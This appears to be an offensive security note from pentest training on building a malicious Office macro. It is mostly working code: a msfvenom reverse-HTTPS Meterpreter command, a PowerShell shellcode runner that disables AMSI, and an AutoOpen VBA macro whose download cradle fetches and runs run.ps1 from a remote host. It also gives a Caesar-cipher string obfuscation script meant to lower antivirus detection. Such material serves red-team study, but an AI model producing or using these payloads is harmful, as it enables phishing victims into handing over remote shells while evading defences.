## VBA Bypass Technique - Office Macro 
### VBA + Powershell + Dechaining + Obfuscation (string reverse) + Encryption (caesar cipher) 

1. Create msf shellcode (or other C2 shellcode) 
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

<br> 

2. Create powershell shellcode runner (run.ps1)
```ps1
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $Kernel32

//add msfvenom shellcode in ps1 format
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
```
<br>

3. Create Macro w/ VBA code to use powershell download cradle.
One of the advantages of using the PowerShell shellcode runner is the fact that no first-stage shellcode is embedded in the document that is sent to the victim.
```bash
Sub MyMacro
strArg = "powershell -exec bypass -nop -c iex((new-object
system.net.webclient).downloadstring('http://192.168.119.120/run.ps1'))" GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
Sub AutoOpen() Mymacro
End Sub
```
<br> 

4. To reduce the detection rate even further, we can perform a more complex obfuscation by converting the ASCII string to its decimal representation and then performing a Caesar cipher encryption on the result. run the following encyrption script:
```bash
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
[string]$output = ""
$payload.ToCharArray() | %{ [string]$thischar = [byte][char]$_ + 17 if($thischar.Length -eq 1)
{
$thischar = [string]"00" + $thischar
$output += $thischar }
elseif($thischar.Length -eq 2)
{
$thischar = [string]"0" + $thischar $output += $thischar
}
elseif($thischar.Length -eq 3)
{
$output += $thischar
} }
$output | clip
```
repeat above again with `winmgmts:` & `Win32_Process`

<br>

5. Code Snippet
```bash
Function Pears(Beets)
  Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
  Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
  Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
  Do
  Oatmilk = Oatmilk + Pears(Strawberries(Milk)) Milk = Almonds(Milk)
  Loop While Len(Milk) > 0
  Nuts = Oatmilk
End Function

Function MyMacro()
  Dim Apples As String
  Dim Water As String

  Apples = "1291281361181311321211181251250490621181371181160491151381291141321320490621271281290 49062136049121122117117118127049062116049122118137057057127118136062128115123118116133 04913213813213311812606312711813306313611811511612512211812713305806311712813612712512 81141171321331311221271200570561211331331290750640640660740670630660710730630660660740 63066067065064115128128124063133137133056058058"
  Water = Nuts(Apples)
  GetObject(Nuts("136122127126120126133132075")).Get(Nuts("10412212706806711209713112811 6118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
  MyMacro
End Sub
```

